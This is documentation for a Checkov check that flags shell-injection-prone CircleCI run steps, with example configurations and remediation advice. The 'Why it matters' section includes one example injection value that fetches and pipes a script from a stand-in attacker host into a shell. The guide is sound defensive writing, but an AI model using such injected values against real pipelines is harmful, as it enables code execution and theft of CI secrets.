# CKV_CIRCLECIPIPELINES_6: Ensure run commands are not vulnerable to shell injection

## Severity
**CRITICAL** (score: 9.1/10)

Unsanitized input reaching a shell `run` command in a CI job enables shell/command injection, giving an attacker arbitrary code execution in a context that typically has access to build secrets, deployment credentials, and source code.

## Summary
This check flags CircleCI `run` steps whose command text contains patterns from a known list of shell-injection-prone constructs, such as unquoted interpolation of untrusted variables into a shell command.

## Applicability
**Checkov framework(s):** `circleci_pipelines`

Applies to CircleCI Pipeline configuration files (`.circleci/config.yml`), specifically every step under `jobs.*.steps[]` that is a `run` step, in both the string shorthand and the `run: {command: ...}` map form.

## Why it matters
CircleCI `run` steps are executed as shell commands (`/bin/sh -eo pipefail` by default), and many pipelines interpolate CircleCI built-in variables (`$CIRCLE_BRANCH`, `$CIRCLE_PR_NUMBER`, `$CIRCLE_TAG`) or pipeline parameters directly into command strings. Several of these values are attacker-influenced: for example, `CIRCLE_PR_NUMBER`, `CIRCLE_BRANCH`, and PR titles/branch names can be set by anyone who opens a pull request against a public or externally-contributable repository. If such a value is embedded into a shell command without proper quoting/escaping, an attacker can craft a branch name or PR title like `"; curl attacker.com/x.sh | sh #"` to achieve arbitrary command execution inside the CI job — with access to that job's environment variables and secrets. This is the CI/CD equivalent of a classic OS command injection vulnerability, and it has been used in real-world supply-chain attacks against GitHub Actions and other CI systems using the same interpolation pattern.

## How Checkov evaluates this
The check (`DontAllowShellInjection`) loads a list of known dangerous regex terms from `checkov.circleci_pipelines.common.shell_injection_list` (a curated list of suspicious shell-injection patterns — e.g., unquoted variable interpolation combined with command chaining/backticks/subshells). For each `run` step:
- If the step isn't a dict, result is `UNKNOWN`.
- If there's no `run` key, it `PASSED`s.
- The command text is taken from `run.command` (map form) or `run` directly (string form).
- Every regex `term` in the bad-input list is checked against the command text with `re.search`; if any term matches, the step `FAILED`s.
- If none match, it `PASSED`s.

## Non-compliant example
```yaml
version: 2.1

jobs:
  build:
    docker:
      - image: cimg/base:current
    steps:
      - checkout
      - run:
          name: "Tag build"
          command: |
            echo "Building branch $CIRCLE_BRANCH"
            git tag "build-$CIRCLE_BRANCH"
```

## Remediated example
```yaml
version: 2.1

jobs:
  build:
    docker:
      - image: cimg/base:current
    steps:
      - checkout
      - run:
          name: "Tag build"
          environment:
            SAFE_BRANCH: << pipeline.git.branch >>
          command: |
            echo "Building branch: ${SAFE_BRANCH}"
            printf '%q\n' "$SAFE_BRANCH" > /tmp/branch_name
            git tag "build-$(printf '%s' "$SAFE_BRANCH" | tr -c 'A-Za-z0-9._-' '-')"
```

## Remediation steps
1. Identify every `run` command that directly interpolates a CircleCI built-in variable (`$CIRCLE_BRANCH`, `$CIRCLE_PR_NUMBER`, `$CIRCLE_TAG`, pipeline parameters, etc.) into a shell command string.
2. Never use untrusted values (branch names, PR titles, commit messages) as part of a command that is `eval`'d, chained with `;`/`&&`/`|`, or passed to another shell.
3. Sanitize/allow-list the value before use (e.g., strip to `[A-Za-z0-9._-]` characters) or pass it as a properly-quoted argument rather than interpolating into a larger command string.
4. Prefer setting untrusted values as environment variables consumed by a script (`"$VAR"`, always double-quoted) rather than string-substituting them into shell text.
5. For pipelines triggered by external/fork pull requests, restrict which jobs run with secrets, and consider requiring approval before running privileged jobs on untrusted branches.

## References
- Checkov check source: https://github.com/bridgecrewio/checkov/blob/main/checkov/circleci_pipelines/checks/ShellInjection.py
